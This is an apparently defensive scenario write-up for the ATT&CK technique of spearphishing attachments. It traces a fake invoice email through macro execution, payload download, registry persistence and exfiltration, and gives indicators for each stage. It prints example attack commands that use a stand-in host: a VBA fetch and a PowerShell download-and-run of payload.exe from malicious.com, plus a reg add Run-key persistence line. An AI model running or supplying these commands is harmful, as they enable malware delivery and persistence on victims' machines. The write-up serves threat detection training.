Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a foothold in the victim's environment.

Attack Flow Breakdown:

1. **Initial Access via Email**
   - **Application Involved**: Outlook
   - **User Action**: The user receives an email with a subject line "Urgent: Invoice Attached" and opens it.
   - **Key Artifacts**: Email headers, subject line, sender's email address.
   - **Indicators**: 
     - Suspicious sender domain (e.g., `@malicious.com`).
     - Email contains a malicious attachment named `Invoice_2023.xlsx`.

2. **Opening the Malicious Attachment**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user double-clicks the attachment to open it.
   - **Key Artifacts**: Excel file (`Invoice_2023.xlsx`).
   - **Indicators**: 
     - Excel process (`EXCEL.EXE`) is spawned.
     - The file contains macros that are set to run automatically.

3. **Macro Execution**
   - **Application Involved**: Microsoft Excel
   - **User Action**: The user enables macros when prompted by Excel.
   - **Key Artifacts**: VBA script embedded in the Excel file.
   - **Indicators**: 
     - Execution of a command to download a payload from a remote server.
     - Example command: 
       ```vba
       ' VBA code to download and execute a payload
       Dim objHTTP As Object
       Set objHTTP = CreateObject("MSXML2.ServerXMLHTTP.6.0")
       objHTTP.Open "GET", "http://malicious.com/payload.exe", False
       objHTTP.Send
       ```

4. **Payload Download and Execution**
   - **Application Involved**: Windows Command Prompt (cmd.exe)
   - **User Action**: The macro executes a command to download and run the payload.
   - **Key Artifacts**: Downloaded executable (`payload.exe`).
   - **Indicators**: 
     - Command executed: 
       ```shell
       # Downloading the payload
       cmd /c powershell -Command "Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile '%temp%\payload.exe'"
       # Executing the payload
       start %temp%\payload.exe
       ```

5. **Establishing Persistence**
   - **Application Involved**: Windows Registry
   - **User Action**: The payload modifies the registry to ensure persistence.
   - **Key Artifacts**: Registry keys created under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
   - **Indicators**: 
     - Registry modification command:
       ```shell
       # Adding a registry entry for persistence
       reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousPayload" /t REG_SZ /d "%temp%\payload.exe" /f
       ```

6. **Data Exfiltration**
   - **Application Involved**: Network Communication
   - **User Action**: The payload connects to a command and control (C2) server to exfiltrate data.
   - **Key Artifacts**: Network traffic to C2 server.
   - **Indicators**: 
     - Outbound connection to a suspicious IP address (e.g., `192.0.2.1`).
     - Data packets containing sensitive information (e.g., system information, credentials).

7. **Follow-on Actions**
   - **Application Involved**: Various (e.g., PowerShell, cmd.exe)
   - **User Action**: The attacker uses the established foothold to conduct further reconnaissance or lateral movement.
   - **Key Artifacts**: Additional commands executed on the system.
   - **Indicators**: 
     - Execution of commands to gather system information:
       ```shell
       # Gathering system information
       systeminfo > %temp%\systeminfo.txt
       ```
